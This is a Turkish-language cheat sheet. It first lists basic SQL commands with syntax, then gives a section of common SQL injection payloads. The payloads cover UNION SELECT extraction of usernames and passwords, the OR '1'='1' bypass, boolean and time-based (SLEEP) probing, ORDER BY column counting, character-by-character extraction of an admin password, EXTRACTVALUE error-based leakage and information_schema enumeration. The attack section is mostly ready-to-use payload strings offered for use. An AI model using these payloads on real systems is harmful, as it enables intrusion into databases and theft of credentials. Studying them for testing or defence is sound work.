SQL bir sorgu dilidir ve bu dilde bilinmesi gereken temel komutlar aşağıdakilerdir. 

1. **SELECT**: Veritabanından veri çekmek için kullanılır.
    
    `SELECT kolon1, kolon2 FROM tablo_adi;`
    
2. **INSERT**: Veritabanına yeni bir kayıt eklemek için kullanılır.
    
    `INSERT INTO tablo_adi (kolon1, kolon2) VALUES (deger1, deger2);`
    
3. **UPDATE**: Var olan kayıtları güncellemek için kullanılır.
    
    `UPDATE tablo_adi SET kolon1 = yeni_deger WHERE koşul;`
    
4. **DELETE**: Belirli kayıtları silmek için kullanılır.
    
    `DELETE FROM tablo_adi WHERE koşul;`
    
5. **CREATE TABLE**: Yeni bir tablo oluşturmak için kullanılır.
    
    `CREATE TABLE tablo_adi (     kolon1 veri_tipi,     kolon2 veri_tipi );`
    
6. **ALTER TABLE**: Var olan bir tabloyu değiştirmek için kullanılır.
    
    `ALTER TABLE tablo_adi ADD kolon_adi veri_tipi;`
    
7. **DROP TABLE**: Var olan bir tabloyu silmek için kullanılır.
    
    `DROP TABLE tablo_adi;`
    
8. **WHERE**: Belirli koşullara göre veri çekmek veya işlem yapmak için kullanılır.
    
    `SELECT * FROM tablo_adi WHERE kolon = deger;`
    
9. **ORDER BY**: Sonuçları belirli bir sıralamaya göre sıralamak için kullanılır.
    
    `SELECT * FROM tablo_adi ORDER BY kolon ASC|DESC;`

---

SQLi için en çok kullanılan komutlar 


- **UNION SELECT**: Farklı sorguları birleştirerek başka bir tablodan veri çekmek için kullanılır.
    
    `' UNION SELECT kullanıcı_adı, parola FROM kullanıcılar --`
    
- **OR '1'='1**: Koşul ifadelerini manipüle ederek her zaman doğru bir sonuç döndürmek için kullanılır.
    
    `' OR '1'='1`
    
- **AND 1=1 --** veya **AND 1=2 --**: Koşulları test ederek sorgunun başarısını kontrol etmek için kullanılır.
    
    `' AND 1=1 -- ' AND 1=2 --`
    
- **SELECT DATABASE(), SELECT VERSION()**: Veritabanı ve sürüm bilgilerini almak için kullanılır.
    
    `' UNION SELECT DATABASE(), VERSION() --`
    
- **ORDER BY**: Kolon sayısını belirlemek için sıralama yapılır.
    
    `' ORDER BY 1 --`
    
- **LIMIT**, **OFFSET**: Çekilecek kayıt sayısını kontrol etmek için kullanılır.
    
    `' LIMIT 0,1 --`
    
- **SUBSTRING()**, **LEFT()**, **RIGHT()**: Veri sızıntısı sağlayan parça parça veri çekme yöntemleri.

	`' UNION SELECT SUBSTRING(parola,1,1) FROM kullanıcılar WHERE kullanıcı_adı='admin'--`
    
- **EXTRACTVALUE()**, **UPDATEXML()**: XML tabanlı SQL veri tabanlarında bilgi sızdırmak için kullanılır.
    
    `' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE())) --`
    
- **SLEEP() veya BENCHMARK()**: Zaman tabanlı saldırılarda sorguların yanıt süresini ölçmek için kullanılır.
    
    `' OR SLEEP(5) --`
    
- **INFORMATION_SCHEMA** tablolarına erişim: Veritabanı yapısını keşfetmek için tablo ve kolon adlarını bulmak amacıyla kullanılır.
    
    `' UNION SELECT table_name FROM information_schema.tables --`

